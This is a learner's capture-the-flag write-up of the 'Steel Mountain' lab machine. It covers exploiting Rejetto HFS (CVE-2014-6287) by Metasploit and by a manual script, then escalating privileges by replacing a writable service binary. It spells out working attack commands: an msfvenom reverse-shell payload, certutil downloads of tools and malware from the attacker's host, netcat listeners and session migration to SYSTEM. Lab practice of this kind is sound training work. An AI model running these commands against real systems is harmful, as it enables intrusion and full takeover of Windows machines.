# CTF Writeup: Steel Mountain

---

- Step 1: added <target_ip> to /etc/hosts and multiple nmap scans --> port 8080 looked interesting 
- Step 2: searched up on google for httpfile server 2.3 --> found rejetto httpfile server 2.3 cve
- Step 3: opened up metasploit and made search rejetto --> made use 1 and configured options
to exploit system 
- Step 4: retrieved user.txt flag in C:\\Users\bill\Desktop 
- Step 5: For Priv Escalation I followed the Instruction of the CTF 
--> installed PowerUp.ps1 on local machine
- Step 6: Navigated into root dir --> made cd C:\\
- Step 7: made mkdir Temp and cd Temp uploaded the script there 
- Step 8: made upload ~/PowerUp.ps1 and load powershell --> so we are able to execute the .ps1 script
- Step 9: made powershell_shell --> gained powershell rce
- Step 10: executed script --> made . .\PowerUp.ps1 --> Service "ASCService.exe" is stoppable & writable
- Step 11: created malicious payload named ASCService.exe" on local machine 
--> made msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.21.156.104 LPORT=4443 -e x86/shikata_ga_nai -f exe > ASCService.exe
- Step 12: went into session again --> CTRL + C to get into meterpreter --> navigated to root dir
--> made cd C:\\
- Step 13: went to path of the service C:\Program Files (x86)\IObit\Advanced SystemCare
- Step 14: made upload ~/ASCService.exe --> Says operation failed: Process cannot access file, 
because it is still running.
- Step 15: made shell on meterpreter and made sc stop AdvancedSystemCareService9 --> name of service
--> stopped the service
- Step 16: made CTRL+C again to stop shell --> and made upload ~/ASCService.exe
- Step 17: opened another listener -->  made msfconsole on 3rd window --> made use multi/handler
- Step 18: made set payload windows/meterpreter/reverse_tcp
- Step 19: set LHOST & LPORT --> went into session again on target machine and made shell
- Step 20: made sc start AdvancedSystemCareService9 and executed it
- Step 21: --> apparently the security measures kick me off the session,
so I followed the walkthrough and migrated the session into another (notepad) session
--> made run post/windows/manage/migrate --> gained meterpreter --> NT AUTHORITY/SYSTEM
Highest Privs in Windows --> managed to priv esc by exploiting an unquoted service path.
- Step 22: went to C:\Users\Administrator\Desktop --> retrieved root.txt flag 

---

# Manual Exploit

- Step 1: Installed ncat.exe binary & CVE-2014-6287 from GitHub locally
- Step 2: renamed ncat.exe binary to nc.exe --> because script wants it like this
- Step 3: made python3 -m http.server 80, started listener on another session --> nc -lvnp 4444
- Step 4: defined machine_ip & listener port in script & executed it --> gained rce on listener
- Step 5: went into C:\\Temp Dir and made certutil.exe -urlcache -split -f http://10.21.156.104/winPEASx64.exe to install winPEAS for x64 version, since our System is running on x64 
computer infrastucutre (can check with systeminfo)
- Step 6: went into cd C:/Program Files (x86)/IObit/Advanced SystemCare --> ensured that Service is stopped
- Step 7: made certutil.exe -urlcache -split -f http://10.21.156.104/ASCService.exe to replace service with malware
- Step 8: started listener on script port --> made nc -lvnp 4443 in 4th session
- Step 9: went into rce again and made sc start AdvancedSystemCareService9
- Step 10: Didn't work, since I did not setup the metasploit listener 
- Step 11: made msfconsole --> made use multi/handler --> set payload windows/meterpreter/reverse_tcp
- Step 12: set LHOST & LPORT & made "run"-->  on meterpreter made: run post/windows/manage/migrate
- Step 13: made getuid --> gained NT AUTHORITY/SYSTEM

---

## Key Learnings

- Immensly strengthened Knowledge in Windows CLI
- Immensly strengthened Knowledge in Windows Exploitation & Priv Esc
- Gained WinPEAS into tool arsenal
- Strengthened Metasploit Knowledge

